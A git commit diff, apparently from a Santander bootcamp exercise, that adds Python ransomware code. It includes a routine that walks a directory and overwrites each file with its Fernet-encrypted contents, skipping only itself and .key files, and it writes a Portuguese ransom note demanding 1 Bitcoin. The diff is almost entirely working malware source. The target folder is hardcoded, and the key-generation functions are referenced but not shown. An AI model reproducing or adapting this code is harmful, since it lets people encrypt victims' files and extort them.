58b9fa0e8bc043de619e7d4095c407335ad4516f
Alexandre Gammaro <alexgammaro@yahoo.com.br>
2025-10-22 00:14:43 -0300

    Initial commit

--- DIO/BootCampSantander2025/ransomware.py
+++ DIO/BootCampSantander2025/ransomware.py
@@ -18,4 +18,35 @@ def criptografar_arquivo(arquivo, chave):
     with open(arquivo, "rb") as file:
         dados = file.read()
     dados_encriptados = f.encrypt(dados)
-    with open()
+    with open(arquivo, "wb") as file:
+        file.write(dados_encriptados)
+
+#4. Encontra arquivos para criptografar
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+#5. Mensagem de resgate
+def criar_mensagem_resgate():
+    with open("LEIA ISSO.txt", "w") as f:
+        f.write("Seus arquivos foram criptografados!\n")
+        f.write("Envie 1 Bitcoin para o endereço de email zerofill@proton.me e envie o comprovante.\n")
+        f.write("Após isso, enviaremos a chave para recuperar seus dados!!!")
+
+#6. Execução principal
+def main():
+    gerar_chave()
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("BootCampSantander2025")
+    for arquivo in arquivos:
+        criptografar_arquivo(arquivo, chave)
+    criar_mensagem_resgate()
+    print("Ransonware executado! Arquivos criptografados!!!")
+
+if __name__=="__main__":
+    main()
